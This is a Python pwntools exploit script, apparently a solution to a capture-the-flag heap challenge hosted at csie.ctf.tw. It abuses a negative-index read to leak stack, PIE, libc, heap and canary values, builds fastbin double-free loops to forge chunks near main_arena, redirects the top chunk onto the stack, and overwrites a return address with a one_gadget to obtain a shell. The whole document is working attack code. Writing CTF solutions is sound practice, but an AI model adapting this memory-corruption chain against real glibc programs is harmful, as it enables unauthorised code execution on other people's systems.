#! /usr/bin/env python
from pwn import *

def new(size, content, choice="1"):
    io.sendafter("choice> ", choice)
    io.sendafter("size:", str(size))
    io.sendafter("content:", content)

def print_note(index):
    io.sendafter("choice> ", "2")
    io.sendafter("index:", str(index))
    return io.recvline()[:-1]

def delete_note(index):
    io.sendafter("choice> ", "3")
    io.sendafter("index:", str(index))

def leak(addr, byte=6):
    payload = "-25" + "\x00"*5 + p64(addr)
    leak_addr = u64(print_note(payload)[-byte:].ljust(8,'\x00'))
    return leak_addr


#io = remote('localhost', 8888)
io = remote('csie.ctf.tw', 10135)

# libc offset
libc_offset = 0x20830
onegadget_offset = 0xf0567 
main_arena_offset = 0x3c3b20+0x18

# new
new(0x48, 'create loop and put fake chunk size')    #0
new(0x48, 'create loop and put fake chunk size')    #1
new(0x58, 'create loop and allocate to fake chunk')    #2
new(0x58, 'create loop and allocate to fake chunk')    #3


# leak libc, stack, PIE and heap
leak_stack = u64(print_note(-6)[-6:].ljust(8,'\x00'))
leak_pie = u64(print_note(-2)[-6:].ljust(8,'\x00'))

rsp = leak_stack - 0xe0         # rsp in print_note
pie_base = leak_pie - 0xe50

print "rsp: "+hex(rsp)
print "PIE: "+hex(pie_base)

canary = rsp+0xd8 +1
libc = rsp+0xe8
heap = rsp+0x30
libc_base = leak(libc) - libc_offset
leak_heap = leak(heap)

payload = "-25" + "\x00"*5 + p64(canary)
leak_canary = u64(print_note(payload)[1:8].ljust(8,'\x00')) * 0x100

print "canary: " + hex(leak_canary)
print "libc: " + hex(libc_base)
print "heap: " + hex(leak_heap)


# create loop and put fake chunk size at main_arena+0x20, fastbin(0x50)
delete_note(0)
delete_note(1)
payload = "-25"+"\x00"*5 + p64(leak_heap)
delete_note(payload)

new(0x48, p64(0x60))                        # 0
new(0x48, '123')                            # 1
new(0x48, '123')                            # 0

# create loop and hiject fastbin(0x60) by changing it to main_arena+0x18
delete_note(2)
delete_note(3)
payload = "-25"+"\x00"*5 + p64(leak_heap+0x50*2)
delete_note(payload)

new(0x58, p64(libc_base+main_arena_offset)) # 2
new(0x58, '123')                            # 3
new(0x58, '123')                            # 2
new(0x58, 'A'*0x30 + p64(rsp+0x18))         # overwrite top_chunk

# overwrite ret_addr of new_note()
new(0x18, p64(libc_base+onegadget_offset))  # a new, no fastbin size will cut space from top_chunk

io.interactive()

